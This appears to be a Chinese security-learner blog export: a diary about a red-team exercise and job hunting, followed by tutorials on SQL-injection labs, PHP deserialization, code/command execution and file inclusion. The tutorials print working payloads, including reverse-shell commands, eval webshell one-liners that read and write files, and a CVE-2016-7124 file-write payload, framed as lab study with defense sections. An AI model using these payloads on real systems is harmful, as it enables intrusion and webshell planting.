试了一下，想要不产生杂念，专注于感受身体真的很难，这个教程很简单，可以每天冥想10-15分钟，或者坐公交车时冥想。看看能有什么变化。 今天看了一下笔记本和固态移动硬盘，打算买个集显的Magicbook加512的固态移动硬盘，618价格挺低的分别是3299和539，不知道过了618之后会涨到多少。本来想买个笔记本+Switch，但是想了想买了Switch大概率吃灰，没什么时间玩游戏，要学的东西太多了，最近又萌生了学逆向的想法…看大佬分析钓鱼邮件里附件好有意思。 还想买个带NFC的手环，这样就可以不带公交卡了，而且还不用去充值公交卡。 2019-06-19今天看了一篇关于上市网络安全公司现状及战略分析的文章。上市网络安全公司现状及战略分析 行业趋势：大数据分析、人工智能、安全运营业务、安全云服务 启明星辰 传统安全服务为主 深信服 传统安全行业和云计算业务为主 绿盟科技 中高端技术人才、管理人才流失，业务落地效果有限 安全服务毛利率显著高于其他厂商 天融信 核心产品线是防火墙 安全服务业务萎缩 安全及大数据产品高速增长 360 安全大脑业务 政企业务将成为其重点战略方向及新业务增长点 互联网广告及其服务是主营业务收入 有个问题，文中的员工人数都是在减少，但是说人员规模在增长 看见TK微博上的顺口溜挺不错的，记下来 p0tt1 曾把对企业网络的常见渗透思路写了个顺口溜。里面提到的，其实也就是网络防御工作必须关注的一些基本点。我加了一些注释，便于大家理解： 搞企业，先扫描； 扫描器，商业好； // 商业版扫描器通常比较强大 默认密，都知道； // 很多系统存在默认账号默认口令 社工库，找一找； 邮箱号，先列好； // 搜集企业员工个人邮箱 九头蛇，跑一跑； // Hydra 是一个密码破解工具 搞不定，放大招； 发邮件，凭伪造； // 发钓鱼邮件，比如冒充管理员让用户到指定页面去输入密码 没邮箱，搞网站； 二级域，皆可爆； // 主域的防护通常较好，某些较弱的二级域可作为突破点 老漏洞，没修好； // 有些老漏洞可能没有被恰当地修复，工作失误也可能让漏洞回归 新漏洞，刷一票； // 大部分企业对漏洞能做到一周内修复就算三好学生了 干研发，Git 找； // 常有人把为公司写的代码也传到github上，里面可能会包含口令等 源代码，全都要； // 即使源码不包含口令，也很有助于发现漏洞 CDN ， 可以跳； 防火墙，可以撬； 堡垒机，可以绕； 云防护，可以秒； // 各种防护措施都不是有了就行，需要正确地使用 是企业，没有哪家搞不了！ 最近很喜欢吃甜食，哎，这算是补偿心理了吧。快点结束HW吧！ 这次HW多了好几个称号，X工，专家…还是被一位先生叫专家，感觉对不起他 2019-06-20HW有可能要延迟，我… 今天在boss直聘上写了简历，有2个HR联系，不知道怎么回复，感觉自己还没准备好，但可能边面试变准备效果更好。 今天看采铜的书，讲到求知的三个层次：信息、知识、技能，个人理解信息是零碎的不成体系的知识，知识是融合在一起构成框架的信息，技能则是可以随意拿出来的知识，很多的知识只是知道有这么一回事，但是当真正要用的时候，还需要去翻看笔记，从知识到技能需要不断练习，总结，练习。 采铜对知识的练习有三种方式：写作式练习，将自己学到的知识，重新组织语言、架构写成文字分享出来，亮神说：“分享的过程中，受益最大的是自己”，大概就是这个道理。自己写总结的时候就有明白但说不出来的经历，而且在写的过程中，会有很多之前没有注意到的不懂的知识，需要再去找相关资料。 第二种是游戏式练习，我的理解就是打靶场，VulnHub上的靶场都蛮有意思的。 第三种是设计式练习，我的理解是自己做靶场让别人来打。类似的Sqli Lab，Pikachu等靶场，自己设计相关漏洞需要对漏洞产生原理有一定的了解，并对漏洞的利用有一定的了解，类似Upload Lab这种还需要对中间件、系统存储格式有一定的了解。之前忘了和谁讨论什么样才算是把Web漏洞学会了，我当时就说能做出一套像Pikachu这样涵盖了基本所有Web常见漏洞的靶场，大概就算是学会了。Pikachu的作者也被告知“如果你想搞懂一个漏洞，比较好的方法是：你可以自己先制造出这个漏洞，然后再利用它最后再修复它。”然后每学习一个漏洞，他都自己构造一个，慢慢的就有了Pikachu。 这段时间，不管是看采铜的书还是看时间管理，都有很多相似的地方。 2019-06-21今天早上跳绳，竟然连5分钟400个都跳不到，不知道是最近最近熬夜状态不好，还是地不平。熬夜搞得我鼻子附近又有皮炎了，开始起皮了。昨天看到我牙上有块地方变黑了，已经吓得不敢喝可乐吃雪糕了，找个时间去看下牙，顺便看下能不能把智齿拔了。 今天看知乎，看到一个王世民的回答感觉不错，为什么越努力，越焦虑？，讲了关于学习的方向，需要找到一个主要目标，其他的学习内容都围绕这一个目标。想想我自己每天看的东西里，大概科普是杂草吧。 2019-06-22今天百度了一下，总是叫我们专家的先生，不到60岁，感觉他的个人经历跟之前看过的一部国产电影《郭明义》差不多，都是技术狂人，让外国专家从不重视到敬佩不已。 2019-06-23今天跟主任一起吃饭，感觉很喜欢分享自己的学习经历。 5小时法则：为什么你要终身学习？ 2019-06-24我好酸啊，PS4能玩冰原beta了。想玩居合拔刀气刃斩。 看了一集漏洞银行关于内网渗透的视频，主讲人说会在7月底出关于内网渗透的书。 要写关于HW的收获，现在还没想好能写什么内容。 2019-06-25在知识星球上看到一个英文内网渗透的Gitbook，有中文翻译，不过没有翻译完，看看能不能把剩下的翻译完，然后提交给翻译组，极大概率不能… 我发现我睡觉的床垫总是在向左边移动，不知道为什么，可能我总是在向右边翻身？ HW中，经常想的问题是，在各种安全设备的保护下，怎么才能getshell。钓鱼邮件让我了解到社工的强大，正常的web漏洞在安全设备和补丁面前看起来毫无用处，可能是我发掘漏洞和利用漏洞的能力还没有超过安全设备吧。 2019-06-26昨天晚上在kfc买了杯抹茶，然后晚上就睡不着觉了，中间醒来3次，明明写得不含咖啡。 现在每天脸上都是一层油，会变瘦吗？ 2019-06-27基本睡了一天，感觉好累。 HW最后一天了，希望不要出什么事情。有人说阿里的猪猪侠出来了，说真的要是能看红队的报告，应该能学到很多新知识。 这几天Steam夏促，看了一下愿望单，感觉没什么想买的欲望，想玩的欲望也不是很强，感觉有点类似对甜食的欲望，不去吃，就越不想吃，但是一旦吃了，就越来越想吃。 2019-06-28HW终于结束了，下午去客户那参加了最后的总结会议。照相因为没赶上，就错过了。 想想看怎么写总结。 2019-06-29早上睡到10点才起床，洗了下衣服、床单、被罩。看到2篇HW总结的文章，有一篇里介绍的工具很多而且很详细，蛮不错的，有时间找一下工具，看看怎么用。 晚上打算把之前一直没打完的靶场打完，不过包含图片马之后，就只能执行一个phpinfo的命令，其他命令都不能执行。菜刀连也因为post的内容太多无法正常连接，只返回200。 2019-06-30昨天晚上到3点才睡着，不知道是不是HW养成习惯了。期间找了很多文章，以后睡觉前可以慢慢看，然后记在笔记里，第二天更新到博客里。 早上写完HW总结后，把靶场也做完了，换了蚁剑之后就能成功连接了，蚁剑蛮灵活的可以加请求头和请求内容。 六月最后一天，看看之前写的目标。 六月的目标： 1.学习内网渗透 2.复习之前学习的内容 3.学习Python，今天买了本Python的书，可以参考着学习 4.看《图解TCP/IP》和《图解HTTP》，学习一下网络基础知识 内网渗透就看了一个视频，一个晚上。 并没有复习之前学的内容。 Python也没看。 《图解TCP/IP》就看过一次，《图解HTTP》倒是看完了。 看了2天的《Metasploit渗透测试魔鬼训练营》，看到信息收集之后，就没看了。 2019-072019-07-01新的一个月。 今天做完了之前一直没做完的靶场，收获还可以，这个月要开始找工作，找住的地方。 最近感觉好累，早上总是想多睡一会。 2019-07-02今天看了一下之前的内容，发现好多东西都忘记了，需要重新熟悉一下。 做了一个靶场，提权的方法很多，而且对我来说是新姿势，很不错的靶场。 最近没什么空闲时间背单词，都是扛着睡意快速的背完，这种背法效果不太好，不听语音记得不是很好。 2019-07-03今天又做了一遍Billu b0x，然后在用Metasploit的时候，发现怎么都不能成功利用漏洞，然后尝试看相关漏洞，手动利用，结果发现自己太菜，看了漏洞分析都无法利用。后面才注意到靶场和Kali的IP不在同一子网下，无法相互访问，才无法成功利用。 2019-07-04昨天看了篇微信上的文章，将怎么用图片反弹shell，试了一下并不能打开之后直接弹shell，而且msf生成的POWERSHELL脚本在反弹shell之后，很快会停止运行，直接断开会话。 然后今天中午看了一下群里的讨论说并不能直接打开就反弹shell，需要再使用之前生成图片后返回的一串代码进行反弹。之前就好奇为什么会在将图片和反弹shell的脚本拼接之后返回一串代码，我还以为是报错了，因为看教程上是没有的。 2019-07-05今天下午面试360，自己是真的菜，而且紧张，被面试官说声音颤抖。很多基础的东西都没了解，比如http-only的加固机制，还有就是很多漏洞的利用姿势太少，给我几个环境问我怎么利用，答得并不够好，凉凉。","categories":[],"tags":[]},{"title":"'Sqli-Lab'","slug":"Sqli-Lab","date":"2019-05-03T01:37:18.000Z","updated":"2019-05-11T03:18:38.429Z","comments":true,"path":"2019/05/03/Sqli-Lab/","link":"","permalink":"https://chirec.github.io/2019/05/03/Sqli-Lab/","excerpt":"Less-01字符型&#39;联合查询Or报错注入 联合查询","text":"Less-01字符型&#39;联合查询Or报错注入 联合查询 报错注入 Less-02数值型联合查询Or报错注入 联合查询 报错注入 Less-03字符型&#39;)联合查询Or报错注入 联合查询 报错注入 Less-04字符型&quot;)联合查询Or报错注入 联合查询 报错注入 Less-05字符型&#39;布尔盲注or报错注入 布尔盲注 报错注入 Less-06字符型&quot;布尔盲注Or报错注入 布尔盲注 报错注入 Less-07字符型&#39; 提示：Use outfile 将查询结果写入version.txt文件，提示报错，但文件已经写入成功 也可以写入一句话 php代码使用&#39;进行包裹，可以防止$被浏览器转义导致无法正常写入 Less-08字符型&#39;没有错误回显，无法报错注入 布尔盲注 Less-09字符型&#39;此关标题为基于时间的盲注在代码里，不管是否正确，都显示相同的输出“You are in………..”所以只能使用延时盲注 Less-10字符型&quot;和Less-09一样，都是基于时间的盲注不同之处在于，使用&quot;进行闭合 Less-11字符型&#39;使用万能密码可以登录 可以使用联合查询进行注入 可以使用报错注入进行查询 Less-12字符型&quot;)同样使用万能密码登陆在构造payload时，使用(&quot;&quot;)进行包裹 同样可以使用联合查询、报错查询 Less-13字符型&#39;)使用万能密码登录无回显 使用布尔盲注 Less-14字符型&quot;和Less-13除了闭合方式不同外，其他均相同 由于有错误提示，可以使用报错注入 Less-15字符型&#39;使用万能密码测试闭合 使用布尔盲注 使用延时盲注 Less-16字符型&quot;)使用万能密码测试闭合 和Less-15除了闭合方式不同外，其他均相同 Less-17字符型&#39; 判断闭合 报错提示 1near &apos;&quot;)&apos; WHERE username=&apos;admin&apos;&apos; 第一个和最后一个&#39;是报错自带的，可以无视在payload里写的是&#39;&quot;)，但在报错提示中，少了一个&#39;，所以唯一的解释是这个单引号和前面的单引号闭合了，所以可以判断是字符型&#39;。在尝试的过程中，uname无法产生报错信息，查看源码发现，uname被各种转义，而passwd并没有被转义，所以在passwd处进行注入。在报错信息中，可以看出uname是由单引号包裹的，按照写代码的习惯，可以推断passwd也是由单引号包裹的，但这种推断并不合理。 报错注入 延时盲注 Less-18HTTP头部-UserAgent注入字符型&#39; 为什么不正常注入呢？因为在代码中，uname和passwd都被转义了为什么要从UserAgent注入呢？因为标题有Uagent这题刚打开只显示IP，只有登录才可以显示UA，但uanme和passwd都被转义了，只能正常登录，从Less-17可以修改密码使用BP抓包对HTTP请求进行修改payload中,&#39;1&#39;=&#39;1是因为在代码中insert添加了3个字段，为了不报错，需要再添加一个字段；但是直接注释掉却会报错，不明白为什么。 显示页面 Less-19HTTP头部-Referer注入字符型&#39; 和Less-18除了注入位置不同之外，其他相同从代码上看，不需要,&#39;1因为已经2个字段了，但不加会报错，不明白为什么，需要再想想。 显示页面 Less-20HTTP头部-Cookie注入字符型&#39; 联合查询 登录之后，对cookie进行修改 显示页面 报错注入 登录之后，对cookie进行修改 显示页面 Less-21HTTP头部-Cookie注入字符型&#39;) 联合查询 登录之后，对cookie进行修改 显示页面 报错注入 登录之后，对cookie进行修改 显示页面 Less-22HTTP头部-Cookie注入字符型&quot; 跟Less-21的区别是需要使用&quot;进行闭合 报错注入 登录之后，对cookie进行修改 显示页面 Less-23","categories":[],"tags":[]},{"title":"'PHP反序列化'","slug":"PHP-Serialize-And-Unserialize","date":"2019-04-25T14:04:57.000Z","updated":"2019-07-04T11:23:09.965Z","comments":true,"path":"2019/04/25/PHP-Serialize-And-Unserialize/","link":"","permalink":"https://chirec.github.io/2019/04/25/PHP-Serialize-And-Unserialize/","excerpt":"1. PHP(反)序列化1.1 序列化将变量转换为可保存或传输的字符串的过程； 1.2 反序列化在适当的时候把这个字符串再转化成原来的变量使用。","text":"1. PHP(反)序列化1.1 序列化将变量转换为可保存或传输的字符串的过程； 1.2 反序列化在适当的时候把这个字符串再转化成原来的变量使用。 这两个过程结合起来，可以轻松地存储和传输数据，使程序更具维护性。常见的php系列化和反系列化方式主要有：serialize，unserialize；json_encode，json_decode。 string serialize ( mixed $value )返回字符串，此字符串包含了表示 value 的字节流，可以存储于任何地方。 mixed unserialize ( string $str )对单一的已序列化的变量进行操作，将其转换回 PHP 的值。 HTTP传输数据方式：XML(XXE)JSON 1.3 序列化后123456789101112&lt;?php class test&#123; public $public='chessur'; protected $protected=126; private $private=1.26; public $boolean=true; public $null=NULL; public $array=array(1,2,3,6); &#125; $chessur =new test; echo serialize($chessur);?&gt; 1O:4:&quot;test&quot;:6:&#123;s:10:&quot;public_var&quot;;s:7:&quot;chessur&quot;;s:16:&quot;0x00*0x00protected_var&quot;;i:126;s:17:&quot;0x00test0x00private_var&quot;;d:1.26;s:11:&quot;boolean_var&quot;;b:1;s:8:&quot;null_var&quot;;N;s:5:&quot;array&quot;;a:4:&#123;i:0;i:1;i:1;i:2;i:2;i:3;i:3;i:6;&#125;&#125; 字母 含义 s 字符串(string) i 整型(integer) b 布尔(boolean) d 双精度(double) N 空(NULL) a 数组(array) 1.4 属性public的属性在序列化时，直接显示属性名protected的属性在序列化时，会在属性名前增加0x00*0x00，其长度会增加3private的属性在序列化时，会在属性名前增加0x00classname0x00，其长度会增加类名长度+2 2. PHP反序列化漏洞2.1 漏洞成因1.用户可输入参数2.对用户输入的参数没有进行过滤，或过滤规则不完善3.参数被危险函数使用 2.1.1 魔术方法12345678910111213141516__construct()，类的构造函数__destruct()，类的析构函数__call()，在对象中调用一个不可访问方法时调用__callStatic()，用静态方式中调用一个不可访问方法时调用__get()，获得一个类的成员变量时调用__set()，设置一个类的成员变量时调用__isset()，当对不可访问属性调用isset()或empty()时调用__unset()，当对不可访问属性调用unset()时被调用。__sleep()，执行serialize()时，先会调用这个函数__wakeup()，执行unserialize()时，先会调用这个函数__toString()，类被当成字符串时的回应方法__invoke()，调用函数的方式调用一个对象时的回应方法__set_state()，调用var_export()导出类时，此静态方法会被调用。__clone()，当对象复制完成时调用__autoload()，尝试加载未定义的类__debugInfo()，打印所需调试信息 __construct()和__destruct()会在对象创建或销毁时自动调用； 在对象serialize()过程中，会检查是否具有__sleep()魔术方法。如果存在该方法，则在序列化前执行该方法。__slepp()方法会清理对象，并应该返回一个数组，数组中包含被序列化的对象的所有属性的名称。如果该方法不返回任何内容，则序列化后的字符串将变为N并提示Notice。__sleep()的预期用途是提交需要挂起的数据或执行类似的清理任务。如果有一个非常大的对象，不需要完全保存其所有属性，该功能将非常有用。 在unserialize()过程中，会检查是否具有__wakeup()魔术方法。如果存在该方法，则在反序列化时执行该方法。__wakeup()魔术方法可以重构对象可能具有的任何资源。__wakeup()预期用途是重新建立在序列化期间可能已丢失的任何数据库连接，并执行其他重新初始化任务。 123456789101112131415161718192021222324252627282930313233343536373839&lt;?php class Test &#123; public $value; function __construct()&#123; echo \"__construct\"; echo \"&lt;br /&gt;\"; &#125; function __destruct()&#123; echo \"__destruct\"; echo \"&lt;br /&gt;\"; &#125; function __wakeup()&#123; echo \"__wakeup\"; echo \"&lt;br /&gt;\"; &#125; function __toString()&#123; echo \"__toString\"; echo \"&lt;br /&gt;\"; return $this-&gt;value; &#125; function setValue($parm)&#123; echo \"setValue\"; echo \"&lt;br /&gt;\"; $this-&gt;value = $parm; &#125; &#125; $test = new Test; $test-&gt;setValue(\"chessur\"); $ser_test = serialize($test); echo $ser_test.\"&lt;br /&gt;\"; $obj = unserialize($ser_test); echo $obj.\"&lt;br /&gt;\";?&gt; 123456789//OUTPUT__constructsetValueO:4:&quot;Test&quot;:1:&#123;s:5:&quot;value&quot;;s:7:&quot;chessur&quot;;&#125;__wakeup__toStringchessur__destruct__destruct __autoloading() 传统的PHP只能unserialize()定义过的类，意味着每个PHP文件都需要包含很多文件，在当前主流的PHP框架中，都采用了__autoloading()自动加载类来完成这项繁重的工作。在简化了工作的同时，页为序列化漏洞造成了便捷。 2.2.2 魔术方法执行顺序__wakeup()&gt;__toString()&gt;__destruct() 3. CTF示例welcome to bugkuctf 12345678910111213141516171819202122232425262728293031323334//index.php&lt;?php $txt = $_GET[\"txt\"]; $file = $_GET[\"file\"]; $password = $_GET[\"password\"]; if(isset($txt)&amp;&amp;(file_get_contents($txt,'r')===\"welcome to the bugkuctf\"))&#123; echo \"hello friend!&lt;br&gt;\"; if(preg_match(\"/flag/\",$file))&#123; echo \"不能现在就给你flag哦\"; exit(); &#125;else&#123; include($file); $password = unserialize($password); echo $password; &#125; &#125;else&#123; echo \"you are not the number of bugku ! \"; &#125; ?&gt; &lt;!-- $user = $_GET[\"txt\"]; $file = $_GET[\"file\"]; $pass = $_GET[\"password\"]; if(isset($user)&amp;&amp;(file_get_contents($user,'r')===\"welcome to the bugkuctf\"))&#123; echo \"hello admin!&lt;br&gt;\"; include($file); //hint.php &#125;else&#123; echo \"you are not admin ! \"; &#125; --&gt; 12345678910111213//hint.php&lt;?php class Flag&#123;//flag.php public $file; public function __tostring()&#123; if(isset($this-&gt;file))&#123; echo file_get_contents($this-&gt;file); echo \"&lt;br&gt;\"; return (\"good\"); &#125; &#125; &#125; ?&gt; 在index.php中，通过右键查看源代码，可以看到提示 123456789101112&lt;!-- $user = $_GET[\"txt\"]; $file = $_GET[\"file\"]; $pass = $_GET[\"password\"]; if(isset($user)&amp;&amp;(file_get_contents($user,'r')===\"welcome to the bugkuctf\"))&#123; echo \"hello admin!&lt;br&gt;\"; include($file); //hint.php &#125;else&#123; echo \"you are not admin ! \"; &#125; --&gt; 当user的值为welcome to the bugkuctf时，会进入下一步判断，这里使用php://inputfile会在可以传入一个文件进行本地包含，提示了包含hint.php，所以直接包含hint.php，包含之后发现页面没有变化，因为里面的内容被解析了，使用php://filter/read=convert.base64-encode/resource=hint.php读取文件，再将内容进行base64解码，可以获得上面的hint.php，再通过伪协议获得index.php的内容，可以看到会对password进行反序列化，再看hint.php中Flag类在被转化为字符串时，可以读取并输出文件内容，所以可以写个Flag类的序列化字符串，让它在echo的时候，输出flag.php中的内容。由于需要Flag类，所以$file需要包含hint.php页面。 构造序列化字符串 1O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125; 4. PHP自身漏洞(CVE-2016-7124)4.1 漏洞介绍触发该漏洞的PHP版本为PHP5小于5.6.25或PHP7小于7.0.10。漏洞可以简要的概括为：当序列化字符串中表示对象个数的值大于真实的属性个数时会跳过__wakeup()的执行。 4.2 Demo1234567891011121314151617181920//demo.php&lt;?phpclass test&#123; var $name = \"chessur\"; function __destruct()&#123; $file = fopen(\"D:\\\\phpStudy\\\\WWW\\\\Blog_Serialize\\\\windy.php\",\"w\"); fputs($file,$this-&gt;name); fclose($file); &#125; function __wakeup() &#123; foreach(get_object_vars($this) as $k =&gt; $v) &#123; $this-&gt;$k = null; &#125; echo \"Waking up...\".\"&lt;br /&gt;\"; &#125;&#125;$test = $_POST['test'];$test_unser = unserialize($test);?&gt; 由于__wakeup()的执行顺序在__destruct()之前，所以__wakeup()会将对象内的所有属性设为NULL，在__destruct()执行时，没有内容会写到文件中。但使用漏洞，可以跳过__wakeup()，直接执行__destruct()，这样可以将属性内容写入文件中。 payload 1test=test=O:4:&quot;test&quot;:2:&#123;s:4:&quot;name&quot;;s:18:&quot;&lt;?php phpinfo();?&gt;&quot;;&#125; 执行后会报错，但是数据会被写入到文件中 5. PHP反序列化漏洞防御1.要严格控制用户输入的参数，坚持用户所输入的信息都是不可靠的原则2.要对于unserialize后的变量内容进行检查，以确定内容没有被污染3.对要使用变量的函数进行检查。 6. 参考[1] PHP反序列化漏洞 [2] 浅谈php反序列化漏洞 [3] php反序列化总结 [4] PHP反序列化漏洞成因及漏洞挖掘技巧与案例","categories":[{"name":"OWASP-TOP10","slug":"OWASP-TOP10","permalink":"https://chirec.github.io/categories/OWASP-TOP10/"}],"tags":[{"name":"OWASP-TOP10","slug":"OWASP-TOP10","permalink":"https://chirec.github.io/tags/OWASP-TOP10/"}]},{"title":"'远程代码执行'","slug":"Remote-Code-Execution","date":"2019-04-23T11:59:28.000Z","updated":"2019-07-04T08:49:55.122Z","comments":true,"path":"2019/04/23/Remote-Code-Execution/","link":"","permalink":"https://chirec.github.io/2019/04/23/Remote-Code-Execution/","excerpt":"1. 代码执行和命令执行危害非常大，有些漏洞可以直接GetShell执行命令(代码和系统命令)反弹shell获取系统敏感信息","text":"1. 代码执行和命令执行危害非常大，有些漏洞可以直接GetShell执行命令(代码和系统命令)反弹shell获取系统敏感信息 2.命令执行2.1 原因1.参数可控2.使用了可执行系统命令的函数，system()/exec()/shell_exec()，将用户提交的参数拿来执行，中间传递过程无过滤或过滤不严谨注意：执行的命令是系统命令，Windows或者Linux命令 2.2 分类1.代码层2.第三方组件WordPress中用来处理图片的ImageMagick组件心脏滴血漏洞Java中的命令注入漏洞(struts2/ElasticsearchGroovy等)vBulletin 5.x版本通杀远程代码执行3.系统层MS08-067bash破壳漏洞 2.3 命令执行常用函数``system()passthru()exec()shell_exec()popen()proc_open()pcntl_exec注意：通过站点中命令执行漏洞执行命令的权限是：依托于站点(www_data/iis_user/USERS) 2.4 反弹shell123nc -vlp port -e /bin/bashnc ip:portpython -c &apos;import pty;pty.spawn(&quot;/bin/bash&quot;)&apos; 2.5 Windows下同时执行多条命令语法格式 命令格式 含义 command1 &amp; command2 先后执行 Command1和 command2，无论command1执行是否成功 Command1 &amp;&amp; command2 先后执行 Command1和 command2，只有command1执行成功时才执行command2 Command1 \\ \\ Command2 先后执行 Command1和 command2，只有command1执行失败时才执行command2 Command1\\ Command2 是管道符，将command1的执行结果 传递给 command2 2.6 Linux 下同时执行多条命令语法格式 命令格式 含义 command1 ; command2 先后执行 Command1和 command2，无论command1执行是否成功 command1 &amp; command2 先后执行 Command1和 command2，无论command1执行是否成功 Command1 &amp;&amp; Command2 先后执行 Command1和 command2，只有command1执行成功时才执行command2 Command1 \\ \\ Command2 先后执行 Command1和 command2，只有command1执行失败时才执行command2 Command1\\ Command2 是管道符，将command1的执行结果 传递给 command2 3.代码执行当应用在调用一些能将字符串转化成代码的函数时，没有考虑用户是否能够控制这个字符串，将造成代码注入漏洞。 在php中：eval，assert，preg_replace(‘/*/e’,‘\\$ret=“\\1”;’,\\$data)在Java中：eval，execute，executeglobal在Jsp中：jsp中没有php中的eval函数，到那时可以利用反射机制，使用基于反射机制的表达式引擎，如0GNL，SpELl，MVEL等 花括号内可执行可变变量 1&#123;$&#123;phpinfo()&#125;&#125; 两个示例 1234567&lt;?php $data = $_GET[&apos;data&apos;]; eval(&quot;\\$ret = strtolower(\\&quot;$data\\&quot;);&quot;); echo $ret;?&gt;//payload:?data=&#123;$&#123;phpinfo()&#125;&#125;//payload:?data=&quot;);phpinfo();// 1234567&lt;?php $data = $_GET[&apos;data&apos;]; // echo $data; preg_replace(&apos;/&lt;data&gt;(.*)&lt;\\/data&gt;/e&apos;,&apos;$ret = &quot;\\\\1&quot;&apos;,$data); //echo $ret;?&gt;//payload:?data=&lt;data&gt;&#123;$&#123;phpinfo()&#125;&#125;&lt;/data&gt; preg一句话 1preg_replace(&apos;/abc/e&apos;,$_POST[&quot;cmd&quot;],&apos;abcdef&apos;) 3.1代码执行漏洞利用3.1.1 一句话1?data=&#123;$&#123;eval($_POST[&quot;windy&quot;])&#125;&#125; 3.1.2 获取当前路径123?data=&#123;$&#123;eval($_POST[&quot;windy&quot;])&#125;&#125;windy=system(&apos;pwd&apos;)?data=&#123;$&#123;print(getcwd())&#125;&#125; 3.1.3 读文件1?data=&#123;$&#123;exit(var_dump(file_get_contents($_POST[&apos;f&apos;])))&#125;&#125; 3.1.4 写文件1?data=&#123;$&#123;exit(var_dump(file_put_contents($_POST[&apos;f&apos;],$_POST[&apos;d&apos;])))&#125;&#125; 4. 代码执行漏洞防御1.使用json保存数组，读取数据时不使用eval2.必须使用eval的地方要严格过滤(推荐使用白名单)3.对特殊字符进行转义(addslashes、魔术引号、htmlspecialchars、htmlentities、mysql_real_escape_string等)4.放弃使用preg_replace的e修饰符，使用preg_replace_callback()替换5.若必须使用preg_replace的e修饰符，则必用单引号包裹正则匹配出的对象 5.参考[1] 深入研究preg_replace与代码执行 [2] 慎用preg_replace危险的/e修饰符(一句话后门常用) [3] php伪协议实现命令执行的七种姿势","categories":[],"tags":[]},{"title":"'文件包含总结'","slug":"File-Inclusion","date":"2019-04-22T12:46:11.000Z","updated":"2019-07-04T11:21:08.857Z","comments":true,"path":"2019/04/22/File-Inclusion/","link":"","permalink":"https://chirec.github.io/2019/04/22/File-Inclusion/","excerpt":"1. 文件包含在通过PHP的相应函数（比如include()）引入文件时，由于传入的文件名没有经过合理的校验，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入。","text":"1. 文件包含在通过PHP的相应函数（比如include()）引入文件时，由于传入的文件名没有经过合理的校验，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入。 2. 条件用户能够控制这个动态变量，用户提交的文件名或文件类型没有被过滤或过滤不严谨include()等函数通过动态变量的方式引入需要包含的文件注意：包含过来的文件不管是什么类型的文件，只要文件中有php格式的代码均可被解析 3. 文件包含的四个函数includerequireinclude_once require_once 4. 分类4.1 LFI(LocalFileInclude)能够读取或执行包含本地文件的漏洞，称为本地文件包含漏洞。 条件：无 漏洞危害：读取敏感文件(配置文件、服务器上配置文件)GetShell获取站点源码 配置文件/etc/apache2/sites-enabled/etc/php/7.3/apache2/conf.d/etc/mysql/conf.d 有后缀名限制的文件包含：%00截断 php版本&lt;5.3有前缀限制的文件包含：目录跳转 ../既有头部限制又有尾部限制：目录跳转+%00截断 php版本&lt;5.3 4.2 RFI(RemoteFileInclude)allow_url_fopen 本选项激活允许文件包含函数使用URL形式的fopen的封装协议allow_url_include PHP&gt;=5.2 本选项激活允许访问远端文件，并解析条件：两个参数都打开在php.ini中，allow_url_fopen默认一直是On，而allow_url_include从php5.2之后，就默认为Off。 有后缀名限制的远程文件包含：%00截断 php版本&lt;5.3?截断 #截断 php版本&lt;=5.3 5.PHP伪协议5.1 php://input条件：allow_url_include=on，allow_url_fopen不作要求可以通过 1&lt;?PHP fputs(fopen(&apos;windy.php&apos;,&apos;w&apos;),&apos;&lt;?php eval($_POST[windy])?&gt;&apos;);?&gt; 直接上传WebShell 5.2 php://filter条件：无 读取文件中的内容 123php://filter/read=convert.base64-encode/resource=index.phpphp://filter/convert.base64-encode/resource=index.phpphp://filter/string.str_rot13/resource=index.php 5.3 file://1file://d:/phpstudy/www/webshell.jpg 可以解析 5.4 phar://条件：php版本&gt;=5.3.0info.txt --&gt;打包成zip文件相对路径 1phar://test.zip/phpinfo.txt 可以直接解析zip压缩包文件下的文件 绝对路径 1phar://D:/phpstudy/www/test.zip/phpinfo.txt 5.5 zip://条件：php版本&gt;=5.3.0使用的过程中，只能用绝对路径，在压缩包名后写上%23 5.6 data://条件：php版本&gt;=5.2 allow_url_fopen=On allow_url_include=On利用方式1： 1data://text/plain,&lt;?php phpinfo();?&gt; 利用方式2： 1data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b 图片来源：php伪协议实现命令执行的七种姿势 5.7 伪协议利用5.7.1 获取服务器中session值若可以注册用户名，可以注册带有php代码的用户名，再通过文件包含漏洞包含本地session最终实现RCE命令执行 (/tmp/ 或者 /var/lib/php/ ) login|s:3:&quot;bee&quot;;admin|s:1:&quot;1&quot;;token|s:40:&quot;sessionID&quot; 5.7.2 访问记录文件包含包含/proc/self/environ文件GetShell/proc/self/environ会记录User_Agent使用插件或Burpsuite更改User_Agent条件：php通过CGI去解析、普通用户可读 6. 文件包含防御1.设置白名单2.过滤危险字符3.设置openbasedir4.关闭危险设置(allow_url_fopen&amp;allow_url_include) 7. Tricks这两个姿势是从嘶吼上看到的，文件包含&amp;奇技淫巧。 7.1 phpinfo+LFI 这个trick利用phpinfo会打印上传缓存文件路径的特性，进行缓存文件包含达到getshell的目的。 1.临时文件在phpinfo页面加载完毕后才会被删除。 2.phpinfo页面会将所有数据都打印出来，包括header。 3.php默认的输出缓冲区大小为4096，可以理解为php每次返回4096个字节给socket连接。 7.1.1 竞争流程 1.发送包含了webshell的上传数据包给phpinfo页面，同时在header中塞满垃圾数据。 2.因为phpinfo页面会将所有数据都打印出来，垃圾数据会加大phpinfo加载时间。 3.直接操作原生socket，每次读取4096个字节。只要读取到的字符里包含临时文件名，就立即发送第二个数据包。 4.此时，第一个数据包的socket连接实际上还没结束，因为php还在继续每次输出4096个字节，所以临时文件此时还没有删除。 5.利用这个时间差，在第二个数据包进行文件包含漏洞的利用，即可成功包含临时文件，最终getshell。 7.2 LFI+php7崩溃 利用php7 segment fault特性。 我们可以利用： 12&gt; http://ip/index.php?file=php://filter/string.strip_tags=/etc/passwd&gt; 这样的方式，使php执行过程中出现Segment Fault，这样如果在此同时上传文件，那么临时文件就会被保存在/tmp目录，不会被删除。 8.SMB共享文件包含9. 参考[1] php伪协议实现命令执行的七种姿势 [2] 文件包含&amp;奇技淫巧 [3] 